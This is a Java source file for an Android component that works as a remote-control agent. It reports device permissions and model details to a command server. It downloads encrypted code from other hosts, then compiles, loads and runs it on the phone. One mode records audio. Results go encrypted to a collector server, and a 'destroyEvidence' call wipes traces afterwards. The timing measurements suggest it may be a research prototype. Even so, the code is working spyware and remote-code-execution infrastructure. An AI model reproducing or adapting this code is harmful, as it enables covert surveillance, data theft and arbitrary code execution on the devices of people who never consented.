package com.android.a2faces;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.util.Log;

import com.android.a2faces.compile_unit.Compile;
import com.android.a2faces.compile_unit.NotBalancedParenthesisException;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.Socket;
import java.util.Arrays;
import java.util.regex.Pattern;

import javassist.NotFoundException;

public class CommunicationTask extends AsyncTask<Void, Void, String> {
    private Context context;

    private String socketMainHostname;
    private int socketMainPort;
    private Socket socketMain = null;
    private PrintWriter outMain = null;
    private BufferedReader inMain = null;

    private String socketCodeSenderHostname;
    private int socketCodeSenderPort;
    private Socket socketCodeSender = null;
    private PrintWriter outCodeSender = null;
    private BufferedReader inCodeSender = null;

    private String socketCollectorHostname;
    private int socketCollectorPort;
    private Socket socketCollector = null;
    private PrintWriter outCollector = null;
    private BufferedReader inCollector = null;

    public CommunicationTask(Context context, String socketMainHostname, int socketMainPort) {
        this.context = context;
        this.socketMainHostname = socketMainHostname;
        this.socketMainPort = socketMainPort;
    }
    @Override
    protected String doInBackground(Void... params) {
        try {
            connectToSocketMain(this.socketMainHostname, this.socketMainPort);

            writeOnSocketMain("alive");
            boolean isAlive = true;

            while( isAlive ) {
                String commandReceived = readFromSocketMain();
                Log.d("COMMAND", commandReceived);

                String toSend = "";
                if (commandReceived.equals("Permissions")) {
                    toSend = getPermissions(false);
                } else if (commandReceived.equals("Permissions granted")) {
                    toSend = getPermissions(true);
                } else if (commandReceived.equals("API")) {
                    toSend = "API:" + android.os.Build.VERSION.SDK_INT;
                } else if (commandReceived.equals("Model")) {
                    toSend = "Model:" + android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL;
                } else if (commandReceived.startsWith("Servers: ")) {
                    String[] serversList = commandReceived.substring(9).split(Pattern.quote("|"));
                    Log.d("serversList", Arrays.toString(serversList));

                    String collectorServer = readFromSocketMain();
                    collectorServer = collectorServer.split("Collector: ")[1];
                    String[] collectorParams = collectorServer.split(":");
                    Log.d("collectorServer", Arrays.toString(collectorParams));

                    String resultType = readFromSocketMain();
                    resultType = resultType.split("Result Type: ")[1];
                    Log.d("resultType", resultType);

                    //download phase
                    long startDownloadPhase = System.nanoTime();
                    String code =  "";
                    for (int i = 0; i < serversList.length; i++) {
                        String[] sockParams = serversList[i].split(":");
                        Log.d("sockParams", Arrays.toString(sockParams));

                        //code sender phase @TODO improve this
                        connectToSocketCodeSender(sockParams[0], Integer.parseInt(sockParams[1]));

                        code += Crypto.decryptString(
                                Crypto.sha256(sockParams[1] + sockParams[0]),
                                Crypto.md5(sockParams[0] + sockParams[1]),
                                inCodeSender.readLine());
                        Log.d("SLAVE_COMMAND", code);
                        closeSocketCodeSender();
                        //end code sender phase
                    }
                    long endDownloadPhase = System.nanoTime();
                    //end download phase

                    //new Compile instance
                    Compile compile = new Compile(this.context.getFilesDir(), this.context, code);

                    //parsing phase
                    long startParsing = System.nanoTime();
                    compile.parseSourceCode();
                    long endParsing = System.nanoTime();
                    //end parsing phase

                    //compiling phase
                    long startCompiling = System.nanoTime();
                    compile.assemblyCompile();
                    compile.compile();
                    long endCompiling = System.nanoTime();
                    //end compiling phase

                    long startLoading = System.nanoTime();
                    compile.dynamicLoading(this.context.getCacheDir(), this.context.getApplicationInfo(), this.context.getClassLoader());
                    Object obj = compile.run();
                    long endLoading = System.nanoTime();

                    long startExecution = System.nanoTime();
                    String result = "";
                    Log.d("Schifo", resultType);
                    if (resultType.equals("Sound")) {
                        Method metodo1 = obj.getClass().getDeclaredMethod("run", Context.class);
                        MediaRecorder pezzotto = (MediaRecorder) metodo1.invoke(obj, this.context);

                        Thread.sleep(5000);

                        Method metodo2 = obj.getClass().getDeclaredMethod("stop", Context.class, MediaRecorder.class);
                        result = (String) metodo2.invoke(obj, this.context, pezzotto);
                    } else {
                        Method metodo = obj.getClass().getDeclaredMethod("run", Context.class);
                        result = (String) metodo.invoke(obj, this.context);
                    }
                    long endExecution = System.nanoTime();
                    //end compiling, loading and execution phase

                    //eval timing
                    double timeToDownload = (endDownloadPhase - startDownloadPhase) /1000000.0;
                    double timeToParse =  (endParsing - startParsing) / 1000000.0;
                    double timeToCompile = (endCompiling - startCompiling) / 1000000.0;
                    double timeToLoad =  (endLoading - startLoading) / 1000000.0 ;
                    double timeToExecute =  (endExecution - startExecution) / 1000000.0;
                    String timingToSend = "Timing: " + timeToDownload + "~" + timeToParse + "~" + timeToCompile + "~" + timeToLoad + "~" + timeToExecute;
                    Log.d("Timing", timingToSend);
                    //collection phase TODO improve this
                    connectToSocketCollector(collectorParams[0], Integer.parseInt(collectorParams[1]));

                    String resultToSend = "Result: " + result;
                    String encrypted = Crypto.encryptString(
                            Crypto.sha256(collectorParams[1] + collectorParams[0]),
                            Crypto.md5(collectorParams[0] + collectorParams[1]),
                            timingToSend + "|" + resultToSend);
                    Log.d("COLLECTOR", encrypted);
                    outCollector.println(encrypted);

                    //TODO send this back
                    closeSocketCollector();
                    //end collection phase

                    //destroy all
                    compile.destroyEvidence();
                } else if (commandReceived.equals("close")) {
                    isAlive = false;
                }


                if(!toSend.equals("")) {
                    writeOnSocketMain(toSend);
                }
            }
        } catch (IOException | PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NotBalancedParenthesisException e) {
            e.printStackTrace();
        } catch (NotFoundException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        closeSocketMain();
        closeSocketCodeSender();
        closeSocketCollector();
        return "Executed";
    }

    private String getPermissions(boolean onlyGranted) throws PackageManager.NameNotFoundException {
        PackageInfo info = this.context.getPackageManager().getPackageInfo(this.context.getPackageName(), PackageManager.GET_PERMISSIONS);
        String[] permissions = info.requestedPermissions;

        StringBuilder permissionsAssembled = new StringBuilder("Permissions:");
        StringBuilder permissionsGrantedAssembled = new StringBuilder("Permissions Granted:");
        for (int i = 0; i < permissions.length; i++) {
            if( (info.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0 ) {
                permissionsGrantedAssembled.append(permissions[i]).append('|');
            }

            permissionsAssembled.append(permissions[i]).append('|');
        }

        return onlyGranted?  permissionsGrantedAssembled.toString() : permissionsAssembled.toString();
    }


    /**
     * Establish a connection with the SocketMain
     *
     * @param hostname of SocketMain
     * @param port of SocketMain
     */
    private void connectToSocketMain(String hostname, int port) {
        try {
            if(socketMain == null) {
                Log.d("Main", "[Connecting to socket master...]");
                this.socketMain = new Socket(hostname, port);

                this.outMain =  new PrintWriter(socketMain.getOutputStream(), true);
                this.inMain =  new BufferedReader(new InputStreamReader(socketMain.getInputStream()));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Establish a connection with the SocketCodeSender
     *
     * @param hostname of SocketCodeSender
     * @param port of SocketCodeSender
     */
    private void connectToSocketCodeSender(String hostname, int port) {
        try {
            if(socketCodeSender == null) {
                Log.d("Slave", "[Connecting to socket slave...]");
                this.socketCodeSender = new Socket(hostname, port);
                this.socketCodeSender.setReuseAddress(false);

                this.outCodeSender =  new PrintWriter(socketCodeSender.getOutputStream(), true);
                this.inCodeSender =  new BufferedReader(new InputStreamReader(socketCodeSender.getInputStream()));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Establish a connection with the SocketCollector
     *
     * @param hostname of SocketCollector
     * @param port of SocketCollector
     */
    private void connectToSocketCollector(String hostname, int port) {
        try {
            if(socketCollector == null) {
                Log.d("Collector", "[Connecting to socket collector...]");
                this.socketCollector = new Socket(hostname, port);
                this.socketCollector.setReuseAddress(false);

                this.outCollector =  new PrintWriter(socketCollector.getOutputStream(), true);
                this.inCollector =  new BufferedReader(new InputStreamReader(socketCollector.getInputStream()));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }


    /**
     * Wait for a new message from SocketMain and, when it arrive, decrypt it
     *
     * @return decrypted message read from SocketMain
     * @throws IOException in case of error with buffer
     */
    private String readFromSocketMain() throws IOException {
        String receivedEncrypted = this.inMain.readLine();
        return Crypto.decryptString(
                Crypto.sha256(this.socketMainPort + this.socketMainHostname),
                Crypto.md5(this.socketMainHostname + this.socketMainPort),
                receivedEncrypted);
    }

    /**
     * Encrypt and write message on SocketMain
     *
     * @param message to be encrypted and written
     */
    private void writeOnSocketMain(String message) {
        String messageEncrypted = Crypto.encryptString(
                Crypto.sha256(this.socketMainPort + this.socketMainHostname),
                Crypto.md5(this.socketMainHostname + this.socketMainPort),
                message);
        this.outMain.println(messageEncrypted);
    }


    private void readFromSocketCodeSender() {

    }

    private void writeOnSocketCollector(String message) {

    }



    /**
     * Close connection of SocketMain
     */
    public void closeSocketMain() {
        if(socketMain != null) {
            try {
                Log.d("Main", "[Closing socket...]");
                socketMain.close();
                socketMain = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Close connection of SocketCodeSender
     */
    public void closeSocketCodeSender() {
        if(socketCodeSender != null) {
            try {
                Log.d("SLAVE", "[Closing socket slave...]");
                socketCodeSender.close();
                socketCodeSender = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Close connection of SocketCollector
     */
    public void closeSocketCollector() {
        if(socketCollector != null) {
            try {
                Log.d("COLLECTOR", "[Closing socket collector...]");
                socketCollector.close();
                socketCollector = null;
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    protected void onPostExecute(String result) {
        Log.d("Task", "executed");
    }
}
